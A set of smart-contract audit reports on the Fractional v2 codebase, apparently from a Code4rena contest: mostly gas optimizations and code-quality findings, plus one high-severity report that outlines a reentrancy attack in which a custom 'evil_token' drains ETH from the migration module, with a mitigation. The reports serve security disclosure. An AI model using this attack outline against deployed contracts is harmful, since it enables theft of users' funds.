_proof.length; ++i) { ```  **The above should be modified to** ```      uint256 length = _proof.length;             for (uint256 i = 0; i < length; ++i) { ```  **Other instances to modify** File: MerkleBase.sol [line 110](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L110)  ```             for (uint256 i; i < result.length; ++i) { ```  File: BaseVault.sol [line 64](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L64)  ```         for (uint256 i = 0; i < _tokens.length; ) { ```  File: BaseVault.sol [line 83](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L83)  ```         for (uint256 i = 0; i < _tokens.length; ) { ```  File: BaseVault.sol [line 107](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L107)  ```             for (uint256 i = 0; i < _tokens.length; ++i) { ```  File: BaseVault.sol  [line 130](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L130)  ```             for (uint256 i; i < _modules.length; ++i) { ```  File: BaseVault.sol  [line 132](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L132)  ```                 for (uint256 j; j < leaves.length; ++j) { ```  File: Buyout.sol [line 454](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L454)  ```         for (uint256 i; i < permissions.length; ) { ```  File: MerkleBase.sol [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L78)  The following shows all instances where `_data.length` is being accessed in the function **getProof()**  ```         require(_data.length > 1, "wont generate proof for single leaf"); ``` ```         uint256 size = log2ceil_naive(_data.length); ``` ```         while (_data.length > 1) { ``` ```        } else if (_node + 1 == _data.length) { ```  ### ++i costs less gas compared to i++ or i += 1  (~5 gas per iteration)  ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  i++ increments i and returns the initial value of i. Which means:  ``` uint i = 1;   i++; // == 1 but i == 2   ```  But ++i returns the actual incremented value:  ``` uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ```  In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  **Instances include:** File: Vault.sol  [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78)  ```         for (uint256 i = 0; i < length; i++) {             methods[_selectors[i]] = _plugins[i];         } ```  The above should be modified to:  ```         for (uint256 i = 0; i < length; {             methods[_selectors[i]] = _plugins[i];   unchecked{    ++i;    }         } ```  File: Vault.sol [line 104](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104)  ```         for (uint256 i = 0; i < length; i++) { ```  ### use shorter revert strings(less than 32 bytes)  Every reason string takes at least 32 bytes so make sure your string fits in 32 bytes or it will become more expensive.  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met. Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  File: MerkleBase.sol [line 62](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L62)  ```         require(_data.length > 1, "wont generate root for single leaf"); ```  **Other instances to modify** File MerkleBase.sol [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L78)  ```         require(_data.length > 1, "wont generate proof for single leaf"); ```  I suggest shortening the revert strings to fit in 32 bytes, or using custom errors.  ### Use Custom Errors instead of Revert Strings to save Gas Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  see [Source](https://blog.soliditylang.org/2021/04/21/custom-errors/)     Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert("Insufficient funds.");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  **Instances to modify**  File: FERC1155.sol [line 263-268](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L263-L268)  ```         require(             msg.sender == _from ||                 isApprovedForAll[_from][msg.sender] ||                 isApproved[_from][msg.sender][_id],             "NOT_AUTHORIZED"         ); ```  File: FERC1155.sol [line 275](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L275)  ```         require( _to.code.length == 0 ? _to != address(0) : INFTReceiver(_to).onERC1155Received( msg.sender, _from, _id, _amount, _data ) == INFTReceiver.onERC1155Received.selector, "UNSAFE_RECIPIENT" );    ```  File: FERC1155.sol  [line 297](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L297)  ```         require(metadata[_id] != address(0), "NO METADATA"); ```   ### Use Shift Right/Left instead of Division/Multiplication A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.  While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  [relevant source](https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g008---use-shift-rightleft-instead-of-divisionmultiplication-if-possible)  File: MerkleBase.sol [line 100](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L100)  ```                 _node = _node / 2; ```  The above should be modified to  ```   _node = _node >> 1    ```  File: MerkleBase.sol [line 142](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L142) ```                 result = new bytes32[](length / 2); ```  ### Expressions for constant values such as a call to keccak256(), should use immutable rather than constant  Due to how constant variables are implemented (replacements at compile-time), an expression assigned to a constant variable is recomputed each time that the variable is used, which wastes some gas.  If the variable was immutable instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.   **consequences:** -  Each usage of a "constant" costs ~100gas more on each access (it is still a little better than storing the result in storage, but not much..)  -  Since these are not real constants, they can't be referenced from a real constant environment (e.g. from assembly, or from another library )   See: ethereum/solidity#9232  File: Permit.sol [line 5](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/constants/Permit.sol#L5)  ``` bytes32 constant DOMAIN_TYPEHASH = keccak256(     "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)" ); ```  File: Permit.sol [line 10](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/constants/Permit.sol#L10)  ``` bytes32 constant PERMIT_TYPEHASH = keccak256(     "Permit(address owner,address operator,uint256 tokenId,bool approved,uint256 nonce,uint256 deadline)" ); ``` File: Permit.sol  [line 15](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/constants/Permit.sol#L15)  ``` bytes32 constant PERMIT_ALL_TYPEHASH = keccak256(     "PermitAll(address owner,address operator,bool approved,uint256 nonce,uint256 deadline)" ); ```  ### constants should be defined rather than using magic numbers There are several occurrences of literal values with unexplained meaning .Literal values in the codebase without an explained meaning make the code harder to read, understand and maintain, thus hindering the experience of developers, auditors and external contributors alike.  Developers should define a constant variable for every magic value used , giving it a clear and self-explanatory name. Additionally, for complex values, inline comments explaining how they were calculated or why they were chosen are highly recommended. Following [Solidity’s style guide](https://solidity.readthedocs.io/en/latest/style-guide.html#constants), constants should be named in UPPER_CASE_WITH_UNDERSCORES format, and specific public getters should be defined to read each one of them.  File: Buyout.sol [line 209](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L209)  ```             (tokenBalance * 1000) / ```  File: Buyout.sol [line 211](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L211)  ```             500 ```  File: Buyout.sol [line 86-87](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L86-L87)  ```         uint256 buyoutPrice = (msg.value * 100) /             (100 - ((depositAmount * 100) / totalSupply)); ```  File: FERC1155.sol [line 247](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L247)  ```         royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100; ```  ### Using Private Rather than Public for constants saves gas If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non payable getter functions for deployment  calldata, and not adding another entry to the method ID table   File: FERC1155.sol [line 15](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L15)  ```     string public constant NAME = "FERC1155"; ```  File: FERC1155.sol [line 17](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L17)  ```     string public constant VERSION = "1"; ```  File: Buyout.sol [line 35](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L35)  ```     uint256 public constant PROPOSAL_PERIOD = 2 days; ```  File: Buyout.sol  [line 37](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L37)  ```     uint256 public constant REJECTION_PERIOD = 4 days; ```  File: Migration.sol [line 43](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L43)  ```     uint256 public constant PROPOSAL_PERIOD = 7 days; ```  ### Use CALLDATA Instead of Memory  File: FERC1155.sol [line 68-72](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L68-L72)    When arguments are read only on external functions, the data location should be calldata avoiding the cost of allocating memory or storage.   ```     function emitSetURI(uint256 _id, string memory _uri) external {         if (msg.sender != metadata[_id])             revert InvalidSender(metadata[_id], msg.sender);         emit URI(_uri, _id);     } ``` `string memory _uri` should be modified to `string calldata _uri`  File: FERC1155.sol [line 79-87](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L79-L87)  ```     function mint(         address _to,         uint256 _id,         uint256 _amount,         bytes memory _data     ) external onlyRegistry {         _mint(_to, _id, _amount, _data);         totalSupply[_id] += _amount;     } ``` Since `_data` is only being read and not modified here, we can modify our `bytes memory _data` to `bytes calldata _data`  File: Metadata.sol [line 24-31](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L24-L31)  ```     function setURI(uint256 _id, string memory _uri) external {         address controller = IFERC1155(token).controller();         if (msg.sender != controller)             revert IFERC1155.InvalidSender(controller, msg.sender);           tokenMetadata[_id] = _uri;         IFERC1155(token).emitSetURI(_id, _uri);     } ```  Since `_uri` is only being read we can use calldata instead of memory :  from `string memory _uri` to `string calldata _uri`  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L207-L212   # Vulnerability details  ## Impact  HIGH - Assets can be compromised directly. One can drain eth out from migration module to buyout module using custom made FERC1155 token.  ## Proof of Concept  - [proof of concept: `testCommitReenter_poc`](https://gist.github.com/zzzitron/24c02e069b428f7a95ebc6c931e29b4e#file-2022-07-fractionalv2-poc-modules-t-sol-L283-L339) - [custom made FERC1155 for the attack](https://gist.github.com/zzzitron/24c02e069b428f7a95ebc6c931e29b4e#file-2022-07-fractionalv2-poc-modules-t-sol-L6-L63)  The proof of concept shows a scenario where alice is draining migration module using custom made FERC1155 token.  1. setup: other people are using migration module and they deposited some eth. (using alice and bob just to simplify the set up process) 2. alice prepared the custom FERC1155 (let's say `evil_token`) 3. alice create a vault with the `evil_token` 4. alice proposes and joins with 0.5 ether 5. when alice calls `commit`, the `evil_token` will reenter `commit` and send money to buyout module  Note: For a simplicity, the `evil_token` reenters for a fixed number of times. But one can adjust to drain all the eth in the migration module. Note2: For now the eth is in the buyout module, but given the current implementation of `buyout` module, the same actor can drain eth from buyout.  The `commit` function is not written in Checks, Effects, Interactions (CEI) patterns.   ```solidity // modules/Migration.sol::commit // proposal.isCommited and started are set after the out going calls (i.e. start, setApprovalFor) // Mitigation idea: set the values before the out going calls  206         if (currentPrice > proposal.targetPrice) { 207             // Sets token approval to the buyout contract 208             IFERC1155(token).setApprovalFor(address(buyout), id, true); 209             // Starts the buyout process 210             IBuyout(buyout).start{value: proposal.totalEth}(_vault); 211             proposal.isCommited = true; 212             started = true; 213         } ```  ## Tools Used  foundry  ## Recommended Mitigation Steps  Follow Checks, Effects, Interactions patterns. One can also consider adding reentrancy guard.      
### 1. Unused interface imports  - The interfaces `(IERC1155, IERC20, IERC1155)` imported in [`Transfer.sol`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L4-L6) is not used anywhere inside the contract.   ### 2. Address(0) checks  - It is best practice to add guard checks for address(0) in important settings like constructors. - [BaseVault.sol#L25](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L25) - [Minter.sol#L18](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L18)  ### 3. Unhandeled return value - It is recommended to add `require()` to the boolean return values.  - [execute()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L60) returns boolean values.    ### 4. Unused receive() function will lock ether in contract  - https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L53    ### 5. Less external call be made by calling the token contract's methods directly  - In [start()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L57) function of `Buyout.sol`, while calulating `totalSupply` of vault `IVaultRegistry(registry).totalSupply(_vault)`.  This could be calculated directly by calling `FERC1155(token).totalSupply(id)` directly which will make one less external call.   ```solidity  // before (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); .... uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ....   // After  .... (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); ......... uint256 totalSupply = IERC1155(token).totalSupply(id);   ```   ### 6. Defined error is not used  - [`error MethodNotFound()`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IVault.sol#L11) in `IVault.sol` is not used in the inherited contracts.    ### 7. Use a single modifier instead of using the same guard checks multiple times - [`if (owner != msg.sender) revert NotOwner(owner, msg.sender)`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L87) is used in multiple methods inside `vault.sol`. It is recommended to use a single modifer for better code resue.   ### 8. Use two-step process for transfering ownership  - Unrecoverable critical process like [`transferOwnership()`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93) could use two step process to prevent unintended mistakes.  - same for [`transferController()`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L229) -  First, nominate the address, and second accept the nomination from that address ensuring that the access is indeed secured.  ### 9. Use modifier to check the vault status - There are several instances where a function needs to revert unless the vault is at a certain state. This code is repeated throught several functions. - This can be refactored into a single modifier to make the code look nice and more readable.  for eg. ```solidity      modifier vaultState(address _vault, State required) {         // Reverts if address is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );         if (id == 0) revert NotVault(_vault);         // Reverts if auction state is not successful         (, , State current, , , ) = this.buyoutInfo(_vault);         if (current != required) revert InvalidState(required, current);     } ```  Now this modifier can be used in any function that needs to check the vault is in a certain state before performing certain actions.  for eg, lets use function `porpose` of `Migration.sol`  ```solidity     function propose(         address _vault,         address[] calldata _modules,         address[] calldata _plugins,         bytes4[] calldata _selectors,         uint256 _newFractionSupply,         uint256 _targetPrice     ) external vaultState(_vault, State.INACTIVE) {     ...     ...     }
# [G-01] Redundant zero initialization  Solidity does not recognize null as a value, so uint variables are initialized to zero. Setting a uint variable to zero is redundant and can waste gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L83 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L107 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L104 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L51  ## Recommended Mitigation Steps  Remove the redundant zero initialization `uint256 i;` instead of `uint256 i = 0;`  # [G-02] Cache array length before loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop. This saves gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L83 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L107 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L130 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L132  ## Recommended Mitigation Steps  Cache the array length before the for loop  # [G-03] Use != 0 instead of > 0  Using `> 0` uses slightly more gas than using `!= 0`. Use `!= 0` when comparing uint variables to zero, which cannot hold values below zero  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L186  ## Recommended Mitigation Steps  Replace `> 0` with `!= 0` to save gas  # [G-04] Short require strings save gas  Strings in solidity are handled in 32 byte chunks. A require string longer than 32 bytes uses more gas. Shortening these strings will save gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L62  ## Recommended Mitigation Steps  Shorten all require strings to less than 32 characters  # [G-05] Use prefix not postfix in loops  Using a prefix increment (++i) instead of a postfix increment (i++) saves gas for each loop cycle and so can have a big gas impact when the loop executes on a large number of elements.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L339 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L363 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L104  ## Recommended Mitigation Steps  Use prefix not postfix to increment in a loop  # [G-06] Use calldata instead of memory for function arguments  Using calldata instead of memory for function arguments saves gas sometimes. This can happen when a function is called externally and the memory array values are kept in `calldata` and copied to `memory` during ABI decoding (using the opcode `calldataload` and `mstore`). If the array is used in a for loop, `arr[i]` accesses the value in memory using a `mload`. If calldata is used instead, then instead of going via memory, the value is directly read from `calldata` using `calldataload`. That is, there are no intermediate memory operations that carries this value.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Minter.sol#L24 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L450 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L487 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L73 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L101 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L61 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L73 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L125 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IBuyout.sol#L112 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IBuyout.sol#L114 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IBuyout.sol#L123 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L100 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IModule.sol#L8 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IVault.sol#L49 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IVault.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC1155.sol#L29  Source https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#use-calldata-instead-of-memory-for-function-parameters  ## Recommended Mitigation Steps  Change function arguments from memory to calldata  # [G-07] For loop incrementing can be unsafe  For loops that use i++ do not need to use safemath for this operation because the loop would run out of gas long before this point. Making this addition operation unsafe using unchecked saves gas.  Sample code to make the for loop increment unsafe ``` for (uint i = 0; i < length; i = unchecked_inc(i)) {     // do something that doesn't change the value of i }  function unchecked_inc(uint i) returns (uint) {     unchecked {         return i + 1;     } } ```  Idea borrowed from https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L339 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L363 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L104  ## Recommended Mitigation Steps  Make the increment in for loops unsafe to save gas  # [G-08] Use iszero assembly for zero checks  Comparing a value to zero can be done using the `iszero` EVM opcode. This can save gas  Source from t11s https://twitter.com/transmissions11/status/1474465495243898885  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L59 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L117 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L154 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L189 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L249 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L256 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L281 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L320 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L352 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L388 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L425 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L82 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L114 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L146 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L187 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L299 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L436 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L276 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L124 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L136 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/Multicall.sol#L23 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultRegistry.sol#L42 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultRegistry.sol#L120  ## Recommended Mitigation Steps  Use the assembly `iszero` evm opcode to compare values to zero  # [G-09] Save gas with unchecked  Use unchecked math when there is no overflow risk to save gas. Before index is decreased in remove it is checked for zero condition. This means index will not underflow and can be unchecked.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L86-L87  ## Recommended Mitigation Steps  Add unchecked around math that can't overflow for gas savings. In Solidity before 0.8.0, use the normal math operators instead of safe math functions.  # [G-10] Add payable to constructors that won't receive ETH  Identifying a constructor as payable saves gas. Constructors should only be called by the admin or deployer and should not mistakenly receive ETH. Constructors can be payable to save gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L24 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Minter.sol#L17 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L42 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L53 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L8 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/Metadata.sol#L16 https://github.com/code-423n4/2022-07-fractional/tree/main/src/references/SupplyReference.sol#L15 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultRegistry.sol#L28 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultFactory.sol#L20 https://github.com/code-423n4/2022-07-fractional/tree/main/src/targets/Supply.sol#L16  ## Recommended Mitigation Steps  Add payable to these functions for gas savings  # [G-11] Use internal function in place of modifier  An internal function can save gas vs. a modifier. A modifier inlines the code of the original function but an internal function does not.  Source https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#dde7  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L37 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L45  ## Recommended Mitigation Steps  Use internal functions in place of modifiers to save gas.  # [G-12] Use uint not bool  Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L102 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L148 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L189 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L328 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L353 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L53 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L117 https://github.com/code-423n4/2022-07-fractional/tree/main/src/constants/Permit.sol#L11 https://github.com/code-423n4/2022-07-fractional/tree/main/src/constants/Permit.sol#L16 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/SafeSend.sol#L20 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/Multicall.sol#L18 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/SelfPermit.sol#L21 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/SelfPermit.sol#L48 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L26 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L32 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L98 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L140 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L143 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L40 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L84 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L94 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L117 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IVault.sol#L45 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC721.sol#L14 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC721.sol#L47 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC1155.sol#L9 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC1155.sol#L52  ## Recommended Mitigation Steps  Replace bool variables with uints  # [G-13] Use Solidity errors instead of require  Solidity errors introduced in version 0.8.4 can save gas on revert conditions 